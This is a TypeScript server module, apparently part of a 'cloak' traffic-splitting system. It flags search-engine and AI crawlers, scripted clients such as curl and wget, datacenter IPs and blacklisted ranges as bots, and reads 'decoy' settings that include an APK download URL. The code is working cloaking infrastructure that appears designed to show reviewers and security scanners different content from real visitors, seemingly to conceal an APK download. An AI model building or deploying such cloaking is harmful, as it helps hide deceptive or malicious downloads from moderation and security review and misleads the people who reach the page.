import dns from "node:dns/promises";
import { getDb, getSetting } from "./db";
import { getClientIp } from "./visit";

// ── 已知爬虫/脚本 UA 关键词（移植自 cloak-router/detect.go）──────────────
const KNOWN_BOTS = [
  "googlebot", "bingbot", "baiduspider", "yandexbot", "duckduckbot",
  "gptbot", "oai-searchbot", "chatgpt-user", "claudebot", "claude-web",
  "anthropic-ai", "ccbot", "perplexitybot", "google-extended",
  "bytespider", "amazonbot", "applebot", "facebookexternalhit",
  "crawler", "spider", "bot/", "python-requests", "curl/", "wget/",
  "scrapy", "go-http-client", "java/", "okhttp", "node-fetch",
  "axios", "libwww", "httpclient", "headlesschrome", "phantomjs",
];

// ── 机房 ASN 机构名特征（移植自 cloak-router/asn.go）────────────────────
const DATACENTER_HINTS = [
  "amazon", "aws", "google", "gcp", "microsoft", "azure", "cloudflare",
  "alibaba", "aliyun", "tencent", "huawei", "digitalocean", "linode",
  "ovh", "hetzner", "vultr", "leaseweb", "scaleway", "contabo",
  "oracle", "ibm cloud", "softlayer", "choopa", "datacamp", "kamatera",
  "hosting", "host", "server", "colo", "cloud", "vps", "data center",
  "datacenter", "gigabit", "ucloud", "kingsoft", "baidu",
];

// ── PTR 机房域名特征（移植自 cloak-router/ptr.go）───────────────────────
const PTR_DC_HINTS = [
  "amazonaws.com", "compute.amazonaws", "googleusercontent.com",
  "1e100.net", "azure", "cloudapp.net", "aliyun", "alibaba", "myqcloud.com",
  "tencent", "digitalocean.com", "linode.com", "vultr.com", "ovh.net",
  "hetzner.de", "leaseweb", "scaleway", "contabo.net", "oraclecloud.com",
  "hosting", "server", "static", "colo", "datacenter",
];

const PTR_VERIFIED_BOT_DOMAINS = [
  "googlebot.com", "google.com", "search.msn.com", "crawl.baidu.com",
  "applebot.apple.com", "duckduckgo.com",
];

// ── ASN 判断（复用 geo.ts 已加载的 _asnDesc/_asnStart/_asnEnd）────────────
// geo.ts 没暴露内部数组，直接重用 ip2asn 做机房判断
function ipToUint32(ip: string): number {
  const parts = ip.split(".");
  if (parts.length !== 4) return 0;
  let n = 0;
  for (const p of parts) {
    const v = Number(p);
    if (!Number.isInteger(v) || v < 0 || v > 255) return 0;
    n = (n * 256 + v) >>> 0;
  }
  return n >>> 0;
}

// 懒加载 ASN 表（和 geo.ts 独立，避免耦合）
let _asnLoaded = false;
let _asnStart: Uint32Array | null = null;
let _asnEnd: Uint32Array | null = null;
let _asnOrg: string[] | null = null;

function loadAsnForCloak() {
  if (_asnLoaded) return;
  _asnLoaded = true;
  try {
    const fs = require("node:fs") as typeof import("node:fs");
    const path = require("node:path") as typeof import("node:path");
    const dir = process.env.GEODATA_DIR || path.join(process.cwd(), "geodata");
    const file = path.join(dir, "ip2asn-v4.tsv");
    if (!fs.existsSync(file)) return;
    const lines = fs.readFileSync(file, "utf8").split("\n");
    const starts: number[] = [], ends: number[] = [], orgs: string[] = [];
    for (const line of lines) {
      if (!line) continue;
      const c = line.split("\t");
      if (c.length < 5) continue;
      const s = ipToUint32(c[0]), e = ipToUint32(c[1]);
      if (!s && !e) continue;
      starts.push(s); ends.push(e); orgs.push(c[4].toLowerCase());
    }
    _asnStart = Uint32Array.from(starts);
    _asnEnd = Uint32Array.from(ends);
    _asnOrg = orgs;
  } catch { /* 库缺失时降级 */ }
}

function isDatacenterIp(ip: string): boolean {
  loadAsnForCloak();
  if (!_asnStart || !_asnEnd || !_asnOrg) return false;
  const n = ipToUint32(ip);
  if (!n) return false;
  let lo = 0, hi = _asnStart.length - 1;
  while (lo <= hi) {
    const mid = (lo + hi) >> 1;
    if (n < _asnStart[mid]) hi = mid - 1;
    else if (n > _asnEnd[mid]) lo = mid + 1;
    else {
      const org = _asnOrg[mid];
      return DATACENTER_HINTS.some((h) => org.includes(h));
    }
  }
  return false;
}

// ── PTR 反查（带数据库缓存，TTL 6 小时）─────────────────────────────────
interface PtrResult { isDc: boolean; isBot: boolean; host: string }

async function lookupPtr(ip: string): Promise<PtrResult> {
  const db = getDb();
  const cached = db.prepare(
    "SELECT is_dc, is_bot, host, cached_at FROM ptr_cache WHERE ip = ?"
  ).get(ip) as { is_dc: number; is_bot: number; host: string; cached_at: string } | undefined;

  if (cached) {
    const age = Date.now() - new Date(cached.cached_at).getTime();
    if (age < 6 * 3600 * 1000) {
      return { isDc: !!cached.is_dc, isBot: !!cached.is_bot, host: cached.host };
    }
  }

  let result: PtrResult = { isDc: false, isBot: false, host: "" };
  try {
    const names = await dns.reverse(ip);
    if (names.length > 0) {
      const host = names[0].toLowerCase().replace(/\.$/, "");
      result.host = host;
      result.isDc = PTR_DC_HINTS.some((h) => host.includes(h));
      if (!result.isDc) {
        const isVerifiedBot = PTR_VERIFIED_BOT_DOMAINS.some(
          (d) => host === d || host.endsWith("." + d)
        );
        if (isVerifiedBot) {
          // 正向校验防伪造
          try {
            const addrs = await dns.lookup(host);
            if (addrs.address === ip) result.isBot = true;
          } catch { /* 校验失败不判 bot */ }
        }
      }
    }
  } catch { /* 无 PTR 记录属正常，住宅 IP 常见 */ }

  db.prepare(
    `INSERT INTO ptr_cache (ip, is_dc, is_bot, host, cached_at)
     VALUES (?, ?, ?, ?, datetime('now','localtime'))
     ON CONFLICT(ip) DO UPDATE SET is_dc=excluded.is_dc, is_bot=excluded.is_bot,
       host=excluded.host, cached_at=excluded.cached_at`
  ).run(ip, result.isDc ? 1 : 0, result.isBot ? 1 : 0, result.host);

  return result;
}

// ── 请求头特征评分（移植自 cloak-router/detect.go headerScore）──────────
export function headerScore(headers: Headers): number {
  let score = 0;
  if (headers.get("sec-fetch-mode") === "navigate") score += 3;
  if (headers.get("sec-fetch-dest") === "document") score += 2;
  if (headers.get("sec-fetch-site")) score += 1;
  if (headers.get("sec-fetch-user") === "?1") score += 2;
  if (headers.get("sec-ch-ua")) score += 2;
  if (headers.get("upgrade-insecure-requests") === "1") score += 2;
  if (headers.get("accept-language")) score += 2;
  if (headers.get("accept")?.includes("text/html")) score += 2;
  if (headers.get("accept-encoding")?.includes("gzip")) score += 1;
  if (headers.get("user-agent")?.toLowerCase().includes("mozilla/5.0")) score += 1;
  return score;
}

// ── 服务端初判结果 ────────────────────────────────────────────────────────
export interface ServerVerdict {
  decision: "bot" | "unknown";
  reason: string;
  headerScore: number;
}

// ── 手动 IP 黑名单（CIDR 匹配）─────────────────────────────────────────────

function ipToUint32Cidr(ip: string): number {
  return ipToUint32(ip);
}

// 检查 IP 是否命中黑名单（支持单 IP 和 CIDR）
export function isBlacklisted(ip: string): boolean {
  const db = getDb();
  const rows = db.prepare("SELECT cidr FROM ip_blacklist").all() as { cidr: string }[];
  const ipInt = ipToUint32Cidr(ip);
  if (!ipInt) return false;

  for (const { cidr } of rows) {
    if (cidr.includes("/")) {
      const [base, prefixStr] = cidr.split("/");
      const prefix = parseInt(prefixStr, 10);
      const mask = prefix === 0 ? 0 : (~0 << (32 - prefix)) >>> 0;
      const baseInt = ipToUint32Cidr(base);
      if ((ipInt & mask) === (baseInt & mask)) return true;
    } else {
      if (ipToUint32Cidr(cidr) === ipInt) return true;
    }
  }
  return false;
}

// classifyServer：同步部分（UA + ASN + IP黑名单），PTR 是异步的单独调用
export function classifyServerSync(headers: Headers): ServerVerdict {
  const ua = (headers.get("user-agent") || "").toLowerCase();

  if (!ua) {
    return { decision: "bot", reason: "空 User-Agent", headerScore: 0 };
  }
  for (const b of KNOWN_BOTS) {
    if (ua.includes(b)) {
      return { decision: "bot", reason: "已知爬虫/脚本 UA: " + b, headerScore: 0 };
    }
  }

  const ip = getClientIp(headers);

  if (isBlacklisted(ip)) {
    return { decision: "bot", reason: "IP 黑名单: " + ip, headerScore: 0 };
  }

  if (isDatacenterIp(ip)) {
    return { decision: "bot", reason: "机房 ASN", headerScore: 0 };
  }

  return { decision: "unknown", reason: "需 JS 探针确认", headerScore: headerScore(headers) };
}

// classifyServerAsync：加 PTR 反查（慢，异步）
export async function classifyServerAsync(headers: Headers): Promise<ServerVerdict> {
  const sync = classifyServerSync(headers);
  if (sync.decision === "bot") return sync;

  const ip = getClientIp(headers);
  const ptr = await lookupPtr(ip);
  if (ptr.isBot) {
    return { decision: "bot", reason: "已验证正规爬虫 PTR: " + ptr.host, headerScore: 0 };
  }
  if (ptr.isDc) {
    return { decision: "bot", reason: "机房 PTR: " + ptr.host, headerScore: 0 };
  }

  return sync;
}

// ── 分流总开关 & 配置读取 ─────────────────────────────────────────────────
export function isCloakEnabled(): boolean {
  return getSetting("cloak_enabled") === "1";
}

export function getCloakThreshold(): number {
  return parseInt(getSetting("cloak_threshold") || "8", 10);
}

export function getCloakTokenHours(): number {
  return parseInt(getSetting("cloak_token_hours") || "6", 10);
}

export function getDecoyConfig() {
  return {
    apkUrl: getSetting("cloak_decoy_apk_url") || "",
    imageUrl: getSetting("cloak_decoy_image_url") || "",
    title: getSetting("cloak_decoy_title") || "下载",
  };
}
